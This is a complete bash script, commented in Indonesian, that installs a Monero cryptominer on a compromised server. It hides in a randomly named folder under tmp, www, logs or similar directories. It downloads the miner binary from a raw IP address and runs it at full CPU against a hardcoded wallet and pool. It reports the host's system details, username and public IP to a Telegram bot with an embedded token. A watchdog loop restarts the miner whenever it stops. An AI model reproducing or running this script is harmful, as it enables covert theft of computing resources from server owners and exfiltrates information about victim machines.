#!/bin/bash

# --- CONFIG ---
MINER_URL="http://47.236.124.210/tdn"
MINER_FILE="tdn"
WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
POOL="gulf.moneroocean.stream:443"
PASS="$(whoami)"
CHECK_INTERVAL=30
TELEGRAM_TOKEN="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
TELEGRAM_CHATID="5104210301"

# --- INFO SYSTEM ---
uname_info=$(uname -a)
whoami=$(whoami)

# --- Fungsi Cetak ---
flush_output() {
    echo -e "$1"
}

# --- Pilih Folder Dasar ---
parent_dir="$(dirname "$(pwd)")"
possible_dirs=("tmp" "www" "mail" "logs" "theme")
BASE_DIR=""

for dir in "${possible_dirs[@]}"; do
    full_path="$parent_dir/$dir"
    if [ -d "$full_path" ]; then
        BASE_DIR="$full_path"
        flush_output "[*] Folder '$dir' ditemukan di $full_path, menggunakan sebagai lokasi instalasi."
        break
    else
        flush_output "[*] Folder '$dir' tidak ditemukan di $full_path."
    fi
done

if [ -z "$BASE_DIR" ]; then
    BASE_DIR="$(pwd)/wpp"
    flush_output "[*] Tidak ada folder yang ditemukan, membuat folder custom 'wpp' di $BASE_DIR."
fi

# Jika BASE_DIR adalah restricted, buat folder acak di dalamnya
restricted_dirs=("tmp" "www" "mail" "logs" "theme")
if [[ " ${restricted_dirs[@]} " =~ " $(basename "$BASE_DIR") " ]]; then
    random_folder="logs_$(openssl rand -hex 4)"
    BASE_DIR="$BASE_DIR/$random_folder"
    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
        flush_output "[x] ERROR: Gagal membuat folder random '$random_folder' di $BASE_DIR. Periksa permissions."
        exit 1
    fi
    flush_output "[*] ($(basename "$BASE_DIR")): membuat folder random '$random_folder' di $BASE_DIR."
fi

cd "$BASE_DIR" || exit 1

# --- Get Public IP ---
get_ip() {
    if command -v curl >/dev/null 2>&1; then
        curl -s ifconfig.me || echo "unknown"
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- ifconfig.me || echo "unknown"
    else
        echo "unknown"
    fi
}

# --- Kirim Telegram ---
send_telegram() {
    local MESSAGE="$1"
    local IP=$(get_ip)
    local TELEGRAM_MESSAGE="🖥️ <b>System</b>: <code>$uname_info</code>%0A👤 <b>User</b>: <code>$whoami</code>%0A🌐 <b>IP</b>: <code>$IP</code>%0A📡 <b>Status</b>: $MESSAGE"
    
    if [ -n "$TELEGRAM_TOKEN" ] && [ -n "$TELEGRAM_CHATID" ]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
             -d "chat_id=$TELEGRAM_CHATID" \
             -d "text=$TELEGRAM_MESSAGE" \
             -d "parse_mode=HTML" >/dev/null 2>&1
    fi
}

# --- Cek Dependensi ---
check_dependencies() {
    for cmd in bash wget curl pgrep openssl; do
        if ! command -v $cmd >/dev/null 2>&1; then
            send_telegram "❌ Dependency '$cmd' tidak ditemukan."
            exit 1
        fi
    done
}

# --- Unduh Miner ---
download_miner() {
    if [ ! -f "$MINER_FILE" ]; then
        flush_output "[*] Mengunduh miner dari $MINER_URL..."
        if wget -q -O "$MINER_FILE" "$MINER_URL" || curl -s -o "$MINER_FILE" "$MINER_URL"; then
            chmod +x "$MINER_FILE"
            flush_output "[✓] Miner berhasil diunduh dan diberi izin eksekusi."
        else
            send_telegram "❌ Gagal mengunduh miner dari $MINER_URL"
            exit 1
        fi
    else
        flush_output "[*] File miner sudah ada, skip download."
    fi
}

# --- Jalankan Miner ---
start_miner() {
    local CMD="./$MINER_FILE --url $POOL --user $WALLET --pass $PASS --tls --cpu-max-threads-hint=100 -B"
    flush_output "[*] Menjalankan miner..."
    nohup $CMD >/dev/null 2>&1 &
    sleep 5
    if pgrep -f "$MINER_FILE" >/dev/null 2>&1; then
        send_telegram "✅ Miner berjalan di $(hostname)"
    else
        send_telegram "❌ Gagal menjalankan miner"
    fi
}

# --- Watchdog ---
watch_miner() {
    while true; do
        if ! pgrep -f "$MINER_FILE" >/dev/null 2>&1; then
            send_telegram "⚠️ Miner berhenti, mencoba menjalankan ulang..."
            start_miner
        fi
        sleep $CHECK_INTERVAL
    done
}

# --- Main ---
check_dependencies
download_miner
start_miner
watch_miner
